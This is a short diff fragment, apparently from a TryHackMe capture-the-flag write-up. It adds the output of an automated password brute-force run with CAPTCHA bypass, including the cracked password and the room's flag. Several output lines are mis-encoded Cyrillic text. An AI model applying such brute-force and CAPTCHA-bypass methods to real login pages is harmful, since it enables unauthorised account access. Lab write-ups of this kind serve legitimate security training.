@@ -97,6 +97,12 @@ for password in passwords:
                 continue
 
 browser.quit()
+
+[-] 0@>;L =525@5=: hottie
+[*] @>1C5< ?0@>;L: tinkerbell
+[+] #!%! 0@>;L: tinkerbell
+[+] $;03: Here is your flag: THM{8938aed9fbf43bddb7c0a98f292dca}
+root@ip-10-10-82-126:~# 
 Summary
 Automated successful password brute-force with CAPTCHA bypass.
 
